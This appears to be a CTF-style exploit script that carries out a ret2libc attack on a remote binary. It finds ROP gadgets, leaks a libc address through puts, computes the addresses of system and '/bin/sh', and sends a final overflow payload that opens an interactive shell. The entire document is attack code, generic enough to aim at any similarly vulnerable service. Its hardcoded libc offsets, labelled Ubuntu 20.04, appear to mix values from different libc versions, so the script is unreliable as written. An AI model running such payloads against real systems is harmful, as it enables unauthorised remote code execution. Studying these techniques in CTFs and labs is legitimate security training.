# ret2libc exploitation pattern - most common in modern CTFs
# This demonstrates leaking libc, calculating base, and getting shell

let binary = "./vuln"
let host = "pwn.chal.ctf"
let port = 1337

# Step 1: Analyze binary for protections and gadgets
let elf = analyze(binary)
print("[*] Binary protections:")
print("    PIE:", elf.pie)
print("    NX:", elf.nx)
print("    Canary:", elf.canary)

# Step 2: Find necessary gadgets and addresses
let plt_puts = elf.plt["puts"]
let got_puts = elf.got["puts"]
let got_libc_start = elf.got["__libc_start_main"]
let main_addr = elf.symbols["main"]

# Find ROP gadgets
let gadgets = quick_rop(binary)
let pop_rdi = gadgets.find("pop rdi; ret")
let ret = gadgets.find("ret")

print("[*] Found gadgets:")
print("    pop rdi; ret @", hex(pop_rdi))
print("    ret @", hex(ret))

# Step 3: Connect and leak libc address
let conn = connect(host, port)
print("[+] Connected to", host, ":", port)

# Build leak payload
let offset = 72  # Buffer to RIP
let leak_payload = cyclic(offset) + p64(pop_rdi) + p64(got_libc_start) + p64(plt_puts) + p64(main_addr)

send(conn, leak_payload)
let leaked = recv_until(conn, "\n")
let leak = u64(leaked)

print("[+] Leaked __libc_start_main:", hex(leak))

# Step 4: Calculate libc base and system/binsh
# Auto-detect libc version or use known offset
let libc_base = leak - 0x21b10  # Ubuntu 20.04 offset
let system = libc_base + 0x50d60
let bin_sh = libc_base + 0x1d8678

print("[+] Libc base:", hex(libc_base))
print("[+] system():", hex(system))
print("[+] /bin/sh:", hex(bin_sh))

# Step 5: Send final exploit
# Add extra ret for stack alignment if needed
let final_payload = cyclic(offset) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

send(conn, final_payload)

print("[+] Exploit sent! Dropping to shell...")
interactive(conn)
